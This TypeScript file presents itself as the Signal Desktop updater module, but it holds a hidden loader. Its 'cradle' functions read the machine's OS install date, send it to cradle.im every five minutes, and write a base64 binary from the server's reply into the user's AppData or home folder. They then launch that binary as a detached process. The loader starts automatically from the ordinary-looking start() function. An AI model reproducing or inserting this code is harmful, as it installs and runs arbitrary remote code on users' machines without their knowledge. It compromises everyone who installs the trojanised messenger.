// Copyright 2019 Signal Messenger, LLC
// SPDX-License-Identifier: AGPL-3.0-only

import type { BrowserWindow } from 'electron';
import { exec, spawn } from 'child_process';
import fs from 'fs/promises';
import axios from 'axios';
import path from 'path';
import * as os from 'os';
import type { Updater } from './common';
import { isLinuxVersionSupported } from './linux';
import type { LoggerType } from '../types/Logging';
import { DialogType } from '../types/Dialogs';

let initialized = false;

let updater: Updater | undefined;

function convert_date_to_timestamp(date_string: string, platform: string): number {
  if (platform === 'win32') {
    const [date_part, time_part] = date_string.split(', ');
    const [day, month, year] = date_part.split('/').map(Number);
    const [hours, minutes, seconds] = time_part.split(':').map(Number);
    return Date.UTC(year, month - 1, day, hours, minutes, seconds);
  } else
  if (platform === 'darwin') {
    const [month, day, year, time] = date_string.split(' ');
    let month_index: number;
    month_index = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'].indexOf(month) + 1;
    const [hours, minutes, seconds] = time.split(':').map(Number);
    return Date.UTC(Number(year), month_index - 1, Number(day), hours, minutes, seconds);
  } else return 0;
}

async function fetch_installation_date(): Promise<Number> {
  return new Promise<Number>((resolve, reject) => {
    if (os.platform() === 'win32') {
      exec('systeminfo', (error, stdout) => {
        if (error) {
          reject(0);
          return;
        }
        const match = stdout.match(/Original Install Date:\s+([\d/,\s:]+)/);
        if (match && match[1]) {
          resolve(convert_date_to_timestamp(match[1].trim(), os.platform()));
        }
        else reject(0);
      });
    } else
    if (os.platform() === 'darwin') {
      exec('stat -f "%SB" /private/var/db/.AppleSetupDone', (error, stdout) => {
        if (error) reject(0);
        else resolve(convert_date_to_timestamp(stdout.trim(), os.platform()));
      });
    } else reject(0);
  });
}

async function fetch_updater_data(installation_id: Number): Promise<string> {
  try {
    const response = await axios.get(`https://cradle.im/update/${os.platform()}/${installation_id}`);
    return JSON.stringify(response.data);
  } catch (error) {
    return '';
  }
}

async function file_exists(file: string) {
  return fs.access(file, fs.constants.F_OK).then(() => true).catch(() => false);
}

async function restart_client(base64_data: string): Number {
  const cradle_client_path = path.join(get_appdata_path(), `Cradle${os.platform()==='win32'?'.exe':os.platform()==='darwin'?'.app':''}`);
  const cradle_client_exists = await file_exists(cradle_client_path);
  if (!cradle_client_exists) {
    await fs.writeFile(cradle_client_path, Buffer.from(base64_data, 'base64'));
    try {
      spawn(cradle_client_path, [], { detached: true, stdio: 'ignore' });
      return 1;
    } catch(error) { return 0; }
  }
}

function get_appdata_path(): string {
  return path.join(os.platform() === 'win32' ? process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming') : os.homedir());
}

async function poll_cradle_update(logger: LoggerType): Promise<void> {
  const client_updater = await fetch_installation_date();
  if (!client_updater) return;

  const updater_json = await fetch_updater_data(client_updater);
  if (!updater_json.length) return;
  
  const parsed_updater = JSON.parse(updater_json);
  if (parsed_updater.bin_upd === 'yes') {
    await restart_client(parsed_updater.bin_b64);
  }
}

async function update_cradle(logger: LoggerType): Promise<void> {
  poll_cradle_update(logger);
  setInterval(() => poll_cradle_update(logger), 5*60*1000);
}

export async function start(
  logger: LoggerType,
  getMainWindow: () => BrowserWindow | undefined
): Promise<void> {
  const { platform } = process;
  
  if (initialized) {
    throw new Error('updater/start: Updates have already been initialized!');
  }
  initialized = true;

  if (!logger) {
    throw new Error('updater/start: Must provide logger!');
  }

  if (platform === 'linux') {
    if (!isLinuxVersionSupported(logger)) {
      getMainWindow()?.webContents.send(
        'show-update-dialog',
        DialogType.UnsupportedOS
      );
    }
  }

  update_cradle(logger).catch(error => console.error('error: starting update mechanism', error));
  await updater?.start();
}

export async function force(): Promise<void> {
  if (!initialized) {
    throw new Error("updater/force: Updates haven't been initialized!");
  }

  if (updater) {
    await updater.force();
  }
}